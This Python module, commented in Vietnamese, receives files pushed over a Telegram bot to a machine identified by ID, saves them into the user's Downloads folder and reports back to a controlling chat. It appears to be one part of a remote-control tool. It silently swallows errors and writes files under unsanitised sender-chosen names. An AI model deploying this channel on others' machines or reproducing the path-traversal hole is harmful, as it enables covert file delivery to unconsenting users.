"""
Module nhận file từ Telegram và lưu vào máy tính
"""
import os
import asyncio
from telegram import Bot
from telegram.error import TelegramError
from config import TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, TEMP_DIR


class FileReceiver:
    def __init__(self, bot_token=None, chat_id=None, machine_id=None):
        """
        Khởi tạo file receiver
        
        Args:
            bot_token: Telegram bot token
            chat_id: Chat ID để nhận file
            machine_id: Machine ID để nhận diện
        """
        self.bot_token = bot_token or TELEGRAM_BOT_TOKEN
        self.chat_id = chat_id or TELEGRAM_CHAT_ID
        self.machine_id = machine_id or "UNKNOWN"
        self.bot = None
        
        if self.bot_token and self.bot_token != "YOUR_TELEGRAM_BOT_TOKEN_HERE":
            self.bot = Bot(token=self.bot_token)
        
        self.download_dir = os.path.join(
            os.environ.get('USERPROFILE', ''),
            'Downloads',
            'TelegramFiles'
        )
        if not os.path.exists(self.download_dir):
            os.makedirs(self.download_dir)
    
    async def check_file_messages(self):
        """Kiểm tra tin nhắn có file từ Telegram"""
        try:
            if not self.bot:
                return
            
            # Lấy tin nhắn mới nhất
            updates = await self.bot.get_updates(limit=10)
            
            for update in updates:
                if not update.message:
                    continue
                
                message = update.message
                
                # Kiểm tra caption có chứa Machine ID không
                caption = message.caption or ""
                text = message.text or ""
                
                # Format: /send MACHINE_ID hoặc caption có MACHINE_ID
                target_id = None
                if text.startswith('/send'):
                    parts = text.split(' ', 1)
                    if len(parts) >= 2:
                        target_id = parts[1].strip()
                elif caption:
                    # Tìm Machine ID trong caption
                    if self.machine_id in caption or self.machine_id[-8:] in caption:
                        target_id = self.machine_id
                
                # Kiểm tra xem file có dành cho máy này không
                if target_id and (target_id == self.machine_id or target_id == self.machine_id[-8:]):
                    # Nhận file
                    if message.document:
                        await self.download_file(message.document, message.caption or "")
                    elif message.photo:
                        await self.download_photo(message.photo, message.caption or "")
                    elif message.video:
                        await self.download_video(message.video, message.caption or "")
                    elif message.audio:
                        await self.download_audio(message.audio, message.caption or "")
        
        except Exception:
            pass
    
    async def download_file(self, document, caption=""):
        """Tải file document"""
        try:
            file = await self.bot.get_file(document.file_id)
            filename = document.file_name or f"file_{document.file_id}.bin"
            
            # Tạo đường dẫn lưu file
            file_path = os.path.join(self.download_dir, filename)
            
            # Tải file
            await file.download_to_drive(file_path)
            
            # Gửi xác nhận
            await self.bot.send_message(
                chat_id=self.chat_id,
                text=f"✅ File received on {self.machine_id}\n📁 Saved to: {file_path}\n📝 Caption: {caption}"
            )
            
            return file_path
        except Exception as e:
            await self.bot.send_message(
                chat_id=self.chat_id,
                text=f"❌ Error receiving file on {self.machine_id}: {str(e)}"
            )
            return None
    
    async def download_photo(self, photo_list, caption=""):
        """Tải ảnh"""
        try:
            # Lấy ảnh có độ phân giải cao nhất
            photo = max(photo_list, key=lambda p: p.file_size)
            file = await self.bot.get_file(photo.file_id)
            
            filename = f"photo_{photo.file_id}.jpg"
            file_path = os.path.join(self.download_dir, filename)
            
            await file.download_to_drive(file_path)
            
            await self.bot.send_message(
                chat_id=self.chat_id,
                text=f"✅ Photo received on {self.machine_id}\n📁 Saved to: {file_path}"
            )
            
            return file_path
        except Exception as e:
            return None
    
    async def download_video(self, video, caption=""):
        """Tải video"""
        try:
            file = await self.bot.get_file(video.file_id)
            filename = video.file_name or f"video_{video.file_id}.mp4"
            file_path = os.path.join(self.download_dir, filename)
            
            await file.download_to_drive(file_path)
            
            await self.bot.send_message(
                chat_id=self.chat_id,
                text=f"✅ Video received on {self.machine_id}\n📁 Saved to: {file_path}"
            )
            
            return file_path
        except Exception as e:
            return None
    
    async def download_audio(self, audio, caption=""):
        """Tải audio"""
        try:
            file = await self.bot.get_file(audio.file_id)
            filename = audio.file_name or f"audio_{audio.file_id}.mp3"
            file_path = os.path.join(self.download_dir, filename)
            
            await file.download_to_drive(file_path)
            
            await self.bot.send_message(
                chat_id=self.chat_id,
                text=f"✅ Audio received on {self.machine_id}\n📁 Saved to: {file_path}"
            )
            
            return file_path
        except Exception as e:
            return None


if __name__ == "__main__":
    from machine_id import MachineID
    
    machine = MachineID()
    receiver = FileReceiver(machine_id=machine.get_id())
    
    print(f"File Receiver initialized for Machine: {machine.get_id()}")
    print("Waiting for files from Telegram...")

